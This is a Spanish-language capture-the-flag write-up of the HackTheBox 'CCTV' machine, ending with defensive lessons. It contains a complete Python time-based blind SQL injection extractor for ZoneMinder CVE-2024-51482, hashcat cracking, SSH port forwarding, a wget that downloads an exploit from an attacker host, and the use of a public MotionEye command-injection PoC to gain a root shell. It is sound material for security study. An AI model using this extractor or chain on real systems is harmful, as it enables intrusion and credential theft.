ZoneMinder v1.37.63 expuesto en el vhost principal con las **credenciales por defecto `admin:admin`** abre un contexto autenticado vulnerable a **CVE-2024-51482** — una inyección SQL ciega en el parámetro `tid` del endpoint `/zm/index.php?view=request&request=event&action=removetag`, explotada mediante un extractor time-based a medida escrito en Python + pwntools que dumpea la tabla `zm.Users` carácter a carácter. El hash de `mark` recuperado — bcrypt de MD5-de-la-password, modo 25600 de hashcat — se crackea a `opensesame` y da acceso SSH; el fichero `user.txt` no está en el home de `mark` sino en `/home/sa_mark/user.txt`, solo legible tras el root. La enumeración de servicios en localhost revela **MotionEye v0.43.1b4** escuchando en `127.0.0.1:8765`, alcanzado mediante un port forward local de SSH; el servicio es vulnerable a **CVE-2025-60787** (inyección de comandos autenticada), que rechaza las credenciales por defecto `user:<vacía>`. El fichero `/etc/motioneye/motion.conf` almacena la contraseña de admin en texto plano (`989c5a8ee87a0e9521ec81a79187d162109282f0` — una cadena de 40 caracteres que parece un hash SHA1 pero es la contraseña en sí) — suministrándola tal cual al driver del exploit como `--password` se obtiene una reverse shell como **root**.

### Aplicación Web — identificación de ZoneMinder

Navegando a `http://cctv.htb/` cargó la portada de lo que se identificaba como una appliance de monitorización CCTV. Un botón de login en la cabecera enlazaba a `/zm/index.php`, revelando la aplicación subyacente: **ZoneMinder**, una plataforma open-source de videovigilancia históricamente desplegada en instalaciones de cámaras domésticas y de pequeños negocios.

ZoneMinder pertenece a una gran familia de aplicaciones web tipo appliance que se distribuyen con **credenciales por defecto documentadas** (`admin:admin`). Los fabricantes publican estos defaults en sus guías de instalación asumiendo que los operadores los cambian en el primer login; las mismas guías nunca dejan de aclarar que hacerlo es crítico y los mismos operadores nunca dejan de ignorar el aviso. En la práctica, `admin:admin` es la primera credencial a probar en cualquier interfaz de CCTV / cámara / DVR / gestión IoT.

El login aceptó `admin:admin` al primer intento. El menú de usuario del dashboard mostraba la versión exacta:

## Explotación — CVE-2024-51482 (Inyección SQL Ciega en ZoneMinder)

### Entendiendo la Vulnerabilidad

El endpoint vulnerable es `/zm/index.php?view=request&request=event&action=removetag&tid=<valor>`. El parámetro `tid` (tag ID) se inserta directamente en la sentencia SQL que elimina un tag de un evento, sin parametrización. El endpoint requiere una sesión válida (cookie `ZMSESSID`), por lo que la explotación depende del login anterior con las credenciales por defecto.

La inyección es **ciega** — el endpoint no refleja el resultado de la query en su respuesta, no emite códigos de estado HTTP distinguibles según condiciones true/false, y no devuelve errores de base de datos. El oráculo fiable es el **tiempo**: la función `SLEEP(N)` de MySQL puede invocarse condicionalmente, y el tiempo transcurrido de la petición HTTP se convierte en la respuesta booleana. Si la condición inyectada es verdadera, la query se bloquea N segundos y la petición tarda N+ segundos; si es falsa, la query retorna inmediatamente.

El wrapper de condición utilizado a lo largo del extractor:

```sql
1 AND (SELECT 1 FROM (SELECT(IF(<condition>, SLEEP(<n>), 0))a))
```

El idioma exterior `SELECT 1 FROM (SELECT(...)a)` es necesario porque MySQL requiere que las subconsultas derived-table en la cláusula `FROM` tengan un alias — eso es lo que hace `a`. Sin el wrapper, MySQL rechaza el `IF(cond, SLEEP, 0)` como sintácticamente inválido en el contexto donde se inyecta.

### El extractor a medida

Las PoCs públicas disponibles para CVE-2024-51482 eran engorrosas para el objetivo concreto de dumpear únicamente la tabla `zm.Users`, así que se escribió un extractor específico. Utiliza `log.progress` de `pwntools` para salida de estado en tiempo real (ver la extracción carácter a carácter en vivo es útil tanto para tener confianza durante la ejecución como para detectar anomalías pronto), y una búsqueda lineal carácter a carácter sobre el alfabeto `[a-zA-Z0-9$./]` — el conjunto de caracteres presentes en hashes bcrypt más los caracteres típicos de un username.

```python
import requests
import sys
import time
import argparse
from pwn import *
import string

characters = string.ascii_letters + string.digits + "$./"

def get_arguments():
    ap = argparse.ArgumentParser(description="CVE-2024-51482 ZoneMinder SQLi")
    ap.add_argument("-i", "--ip", required=True, help="IP de la victima")
    ap.add_argument("-c", "--cookie", required=True, help="Cookie de sesión \"ZMSESSID\"")
    ap.add_argument("-s", "--sleep", type=int, default=1, help="sleep de verificación default=2")
    ap.add_argument("-q", "--query", help="subconsulta SQL a extraer (una fila)")
    args = ap.parse_args()
    return args


def is_true(ip, cookie, sleep, condition):
    """True si la condicion SQL es verdadera (la peticion tardo ~sleep)."""
    payload = f"1 AND (SELECT 1 FROM (SELECT(IF( {condition}, SLEEP({sleep}), 0) ))a)"
    url = f"http://{ip}/zm/index.php?view=request&request=event&action=removetag&tid={payload}"
    try:
        start = time.time()
        requests.get(url, cookies={'ZMSESSID': cookie}, timeout=sleep + 10)
        elapsed = time.time() - start
        return elapsed >= sleep
    except Exception as e:
        print(f"Error: {e}")
        return False


def get_count(ip, cookie, sleep, count_subquery, maxn=50):
    """Averigua cuantas filas hay, para no depender de cadenas vacias."""
    progress = log.progress("Obtención del número de columnas")
    for n in range(maxn + 1):
        progress.status(f"Probando con {n} columnas")
        if is_true(ip, cookie, sleep, f"{count_subquery}{n}"):
            progress.success(f"La tabla tiene {n} columnas")
            return n

    progress.error("Error obteniendo el número de columnas")
    sys.exit(1)


def extract_value(ip, cookie, sleep, i, maxlen=70):
    """Extrae la cadena que devuelve subquery, caracter a caracter."""
    progress = log.progress(f"[{i+1}]")
    result = ""
    for pos in range(1, maxlen + 1):
        found = False
        for char in characters:
            progress.status(result + char)
            cond = f"substring((select Username from zm.Users limit {i},1), {pos}, 1) = '{char}'"
            if is_true(ip, cookie, sleep, cond):
                result += char
                found = True
                break
        if not found:
            break

    username = result + ":"

    result = ""
    for pos in range(1, maxlen + 1):
        found = False
        for char in characters:
            progress.status(username + result + char)
            cond = f"substring((select Password from zm.Users limit {i},1), {pos}, 1) = '{char}'"
            if is_true(ip, cookie, sleep, cond):
                result += char
                found = True
                break
        if not found:
            break

    progress.success(username + result)
    return username + result


def main():
    args = get_arguments()
    print("Blind SQL Injection - CVE-2024-51482 ZoneMinder\n")

    n = get_count(args.ip, args.cookie, args.sleep, "(select count(*) from zm.Users) = ")

    with open("creds.txt", 'a') as file:
        for i in range(n):
            creds = extract_value(args.ip, args.cookie, args.sleep, i)
            file.write(creds+"\n")


if __name__ == '__main__':
    main()
```

Dos detalles de diseño del script merecen ser señalados. Primero, `get_count` itera desde `n=0` hacia arriba preguntando "¿es `count(*)` igual a `n`?" — esto es preferible a intentar detectar una cadena extraída vacía como terminador, porque el bucle carácter a carácter se detiene naturalmente cuando ningún carácter satisface la condición (la fila no existe), y hay ambigüedad entre "fila vacía" y "fila que no existe". Conocer el número de filas de antemano elimina esa ambigüedad. Segundo, `extract_value` extrae Username y Password por separado por cada fila en lugar de concatenarlos en la subquery SQL — esto hace que la salida sea legible durante la ejecución y mantiene la longitud de la query manejable.

### Cracking de los hashes

El prefijo del hash `$2y$10$...` identifica el formato como bcrypt con factor de coste 10. `hashcat` en modo autodetect enumeró los modos plausibles:

```bash
hashcat creds.txt
[...]
The following 6 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+===================
  25600 | bcrypt(md5($pass))                                         | Generic KDF
  25800 | bcrypt(sha1($pass))                                        | Generic KDF
  30600 | bcrypt(sha256($pass))                                      | Generic KDF
  28400 | bcrypt(sha512($pass))                                      | Generic KDF
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  33800 | WBB4 (Woltlab Burning Board) [bcrypt(bcrypt($pass))]       | Forums, CMS, E-Commerce
```

El contenedor bcrypt `$2y$` es el mismo en todos ellos; lo que varía es la transformación aplicada al plaintext *antes* de que bcrypt lo hashee. El bcrypt plano (modo 3200) es con mucho el más común, pero ZoneMinder utiliza un esquema **`bcrypt(md5($pass))`** — el plaintext se pasa primero por MD5, y la cadena hex de 32 caracteres resultante se alimenta a bcrypt.

La razón del pre-hash es histórica: bcrypt tiene un **límite de 72 bytes en la entrada**, truncando silenciosamente contraseñas más largas. Los desarrolladores que quieren aceptar passphrases arbitrariamente largas a veces las pre-hashan con MD5 (o SHA-256) para normalizar la longitud. El trade-off es que el pre-hash reintroduce las propiedades de la función pre-hash — las colisiones de MD5, por ejemplo, se convierten en colisiones de bcrypt sobre las mismas cuentas. En la práctica esto rara vez es explotable, pero es una señal de alarma para esquemas que no han pasado por una revisión formal.

El modo 25600 era la elección correcta; un ataque de diccionario contra rockyou produjo el plaintext de `mark`:

```bash
hashcat -m 25600 creds.txt /usr/share/wordlists/rockyou.txt
[...]
$2y$10$przgnazejkcutv5bknexxoglyqaok0hq07lw7aj/qnqzolbxkffg.:opensesame
```

`mark` : `opensesame`. Ni el hash de `admin` ni el de `superadmin` cayeron frente a rockyou en un tiempo razonable.

## Movimiento Lateral — credencial crackeada → `mark` (SSH)

La cuenta `mark` existía también a nivel de SO (visible en `/etc/passwd`), y la contraseña crackeada funcionó directamente:

```bash
ssh mark@cctv.htb
mark@cctv.htb's password: opensesame
Welcome to Ubuntu 24.04.4 LTS
mark@cctv:~$
```

Un detalle inusual: **no hay `user.txt` en el home de `mark`**. Una búsqueda recursiva hizo la situación explícita:

```bash
find / -name "user.txt" 2>/dev/null
find: '/home/sa_mark': Permission denied
```

La flag de usuario estaba en `/home/sa_mark/user.txt`, y `mark` carecía de permisos de lectura sobre ese directorio. Esto es atípico en HackTheBox — normalmente la flag de usuario reside en el home del foothold inicial — y señala que la sección de flags del writeup tendrá que esperar hasta después de la escalada de privilegios. `mark` es la cuenta intermedia cuyo único rol es proporcionar el shell interactivo necesario para la siguiente fase.

## Escalada de Privilegios — `mark` → `root` (MotionEye)

### Enumeración de servicios en localhost

La pasada estándar de enumeración como `mark` no dio nada en los sospechosos habituales de privesc — `sudo -l` vacío, sin anomalías SUID, sin ficheros escribibles tocados por cron. El hallazgo relevante vino de listar los sockets en escucha:

La temática de la caja (CCTV, videovigilancia) hacía muy plausible una interfaz complementaria de gestión de vídeo en esos puertos.

### Port forward de SSH al 8765

Para alcanzar el servicio de localhost desde un navegador en la máquina atacante, se montó un port forward local de SSH:

```bash
ssh -L 7778:127.0.0.1:8765 mark@cctv.htb -N
mark@cctv.htb's password: opensesame
```

El `-L 7778:127.0.0.1:8765` enlaza el puerto 7778 en el loopback del atacante y reenvía cada conexión a través del túnel SSH al `127.0.0.1:8765` del objetivo. El flag `-N` suprime la ejecución de comando remoto — el túnel se mantiene abierto sin ocupar la terminal con un shell interactivo.

Navegando a `http://127.0.0.1:7778/` en un navegador se cargó una pantalla de login de una aplicación titulada "motionEye":

![MotionEye web login form asking for Username and Password with a Remember me toggle and Cancel/Login buttons](/assets/img/HTB/CCTV/cap1.png)

### Identificación de MotionEye y credenciales por defecto

**MotionEye** es un frontend web para el demonio `motion` de detección de movimiento — el mismo linaje que ZoneMinder pero un producto distinto (más pequeño, más orientado a embebidos). El formulario de login seguía el mismo playbook de "defaults primero" que ZoneMinder: la documentación de MotionEye lista `user:<vacía>` como la credencial por defecto de "usuario normal" y `admin:<vacía>` como la de "administrador". La combinación `user:<vacía>` inició sesión y renderizó un panel de vídeo etiquetado como "CAM 01".

La versión de la aplicación era recuperable a través de una URL específica:

```bash
curl -s http://127.0.0.1:7778/version
hostname = "cctv"
version = "0.43.1b4"
motion_version = "4.7.1"
os_version = "Ubuntu 24.04"
```

**MotionEye 0.43.1b4** es vulnerable a **CVE-2025-60787** — una inyección de comandos autenticada con una PoC pública en [`github.com/gunzf0x/CVE-2025-60787`](https://github.com/gunzf0x/CVE-2025-60787). La vulnerabilidad permite inyectar comandos en una llamada de API de gestión de cámaras que espera un valor de campo plano pero lo introduce en un shell. Como el endpoint corre dentro del proceso de MotionEye — cuya unit de systemd lo lanza como **`User=root`** — la explotación exitosa da root inmediato.

### Primer intento del exploit como `user:<vacía>` — 403 unauthorized

La PoC pública se clonó localmente, se staged con `python3 -m http.server 8000`, y se descargó en el objetivo:

```bash
mv CVE-2025-60787/CVE-2025-60787.py CVE-2025-60787/exploit.py
cd CVE-2025-60787 && python3 -m http.server 8000
```

```bash
# En el objetivo (shell de mark):
cd /tmp && wget http://<ATTACKER_IP>:8000/exploit.py
```

Primer intento con las credenciales `user:<vacía>` que habían funcionado en el login:

El exploit autenticó (`Valid credentials provided`), enumeró las cámaras, pero el POST de inyección de comandos devolvió **403 unauthorized**. El endpoint vulnerable requiere privilegios **admin** — el rol `user` es insuficiente. El exploit es real; las credenciales no son suficientes.

### Lectura de `/etc/motioneye/motion.conf` — la contraseña de admin

La configuración de MotionEye reside en `/etc/motioneye/motion.conf`, y resulta ser world-readable (o al menos legible por `mark`):

```bash
cat /etc/motioneye/motion.conf
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on
# @normal_password

setup_mode off
webcontrol_port 7999
webcontrol_interface 1
webcontrol_localhost on
webcontrol_parms 2

camera camera-1.conf
```

El campo `# @admin_password` contiene una cadena hex de 40 caracteres. Parece exactamente un **hash SHA1**, pero no lo es — es la contraseña de admin almacenada en **texto plano**. MotionEye guarda la credencial tal cual en el fichero de configuración, así que no hay nada que crackear: el valor leído de disco es la contraseña que el login espera.

### Almacenamiento de credenciales en texto plano

No hay nada que revertir. MotionEye almacena la contraseña de admin en `motion.conf` y la vuelve a leer tal cual al validar las peticiones de API, de modo que cualquier proceso que pueda leer el fichero ya ha recuperado la credencial en la forma exacta que la autenticación consume. La apariencia hex invita a asumir que debe ser un hash a la espera de ser crackeado — pero se envía tal cual, y crackearlo no tendría sentido.

Este es un fallo reconocido en software antiguo tipo appliance embebido: las credenciales quedan en un fichero de configuración bajo la suposición de que la legibilidad local es protección suficiente. Cualquier primitiva de lectura de ficheros — incluso una de bajo privilegio — convierte esa decisión de almacenamiento en una divulgación completa de la credencial.

El parámetro `--password` del driver del exploit acepta el valor directamente porque es exactamente lo que MotionEye espera.

## Lecciones Clave

- **Las credenciales por defecto documentadas por el fabricante son lo primero que hay que probar en cualquier interfaz tipo appliance.** ZoneMinder, MotionEye y prácticamente cualquier producto DVR/NVR/cámara existente se distribuyen con credenciales publicadas en la guía de instalación. `admin:admin`, `admin:<vacía>`, `user:<vacía>` y las específicas de cada fabricante (`root:calvin` para Dell iDRAC, `admin:password` para muchos routers D-Link) son entradas obligadas en cualquier wordlist de credenciales por una razón. La mitigación es directa — forzar el cambio en el primer login y rechazar el valor por defecto en el lado del servidor — y el hecho de que tantos productos sigan sin hacerlo en 2026 es la crisis persistente de "IoT default passwords".
- **La inyección SQL ciega time-based es universalmente aplicable cuando la respuesta es muda.** Cualquier punto de inyección que alcance la base de datos tiene un oráculo temporal disponible — `SLEEP(N)` en MySQL, `pg_sleep(N)` en PostgreSQL, `WAITFOR DELAY '00:00:0N'` en SQL Server, `dbms_pipe.receive_message('a', N)` en Oracle. El trade-off es velocidad (cientos de peticiones por carácter), pero para extraer datos de alto valor y tamaño acotado — una tabla de usuarios, un config de autenticación, un session store — la espera es un coste único que desbloquea el resto de la cadena.
- **`bcrypt(md5($pass))` deshace las garantías de seguridad de bcrypt.** Envolver bcrypt alrededor de un pre-hash existe para saltarse el límite de 72 bytes de entrada de bcrypt, pero las debilidades del pre-hash pasan a ser las debilidades del esquema compuesto. MD5 tiene familias de colisiones conocidas; dos contraseñas distintas que colisionen en MD5 autenticarán como la misma cuenta. En la práctica esto es explotable solo en escenarios contrivados, pero es una señal de que el esquema no ha sido revisado por un criptógrafo. El hashing de contraseñas moderno debería usar argon2id o scrypt, no bcrypt con workarounds.
- **La flag de usuario fuera del home del foothold es un patrón real en HackTheBox.** La convención de que `user.txt` reside en `~foothold_user` se cumple la mayoría de las veces, pero no siempre. `find / -name "user.txt" 2>/dev/null` tras cada foothold es una comprobación barata que caza las excepciones. El corolario: no cundir el pánico si el shell inicial no ve `user.txt`; sigue enumerando y puede que se vuelva legible tras un lateral posterior o tras el root.
- **Los port forwards de SSH eliminan la capa de defensa "bindeado a localhost".** Un servicio escuchando en `127.0.0.1` solo es alcanzable desde el propio host, lo cual es una postura defensiva que asume que los atacantes no pueden alcanzar el host. Cualquier shell interactivo — incluso uno con pocos privilegios — colapsa esa asunción con `ssh -L`. El binding a localhost es defensa en profundidad, no una barrera de seguridad; debería tratarse como reducción de superficie de ataque, no como eliminación de ella.
- **Una credencial almacenada en un fichero de configuración es una fuga de credencial, tenga la forma que tenga.** El campo `# @admin_password` de MotionEye contiene una cadena hex de 40 caracteres que parece un hash SHA1, pero es la contraseña de admin en texto plano — la autenticación la consume tal cual, así que no hay nada que crackear. Cualquiera que pueda leer `motion.conf` tiene la credencial. El patrón se repite en firmware antiguo de routers, en algunas appliances VoIP, en interfaces de gestión de sistemas embebidos. La lección para los defensores es que guardar una credencial donde un proceso comprometido puede leerla anula el propósito de tener una contraseña — y un valor con forma de hash no es lo mismo que un valor hasheado.
- **Leer el output de error del exploit es donde vive el pivot.** La línea `POST Failed: 403 - {"error": "unauthorized", "prompt": true}` del primer intento de CVE-2025-60787 fue la señal completa de que (a) la vulnerabilidad estaba presente y alcanzable, (b) la autenticación había tenido éxito, y (c) el rol específico asignado a `user` no incluía la autorización del endpoint. Ese trío de hechos apuntaba directamente a buscar credenciales de admin, que apuntaba al fichero de configuración. Los exploits que fallan siguen diciéndote algo útil; la información útil suele estar en las últimas dos líneas del output.
- **Correr el demonio de MotionEye como root es el verdadero vector de escalada de privilegios.** CVE-2025-60787 es una vulnerabilidad real de inyección de comandos, pero la razón de que conceda root es que la unit de systemd especifica `User=root`. Un demonio que aloja streams de cámara y lee ficheros de vídeo no necesita root — un usuario dedicado `motioneye` con acceso a los directorios específicos habría contenido el CVE a un compromiso de cuenta de servicio. La lección recurrente: los servicios deberían correr como la cuenta con menos privilegios que pueda hacer su trabajo, y cualquier parcheo basado en avisos es un sustituto pobre de la directiva `User=` correcta en la línea base.
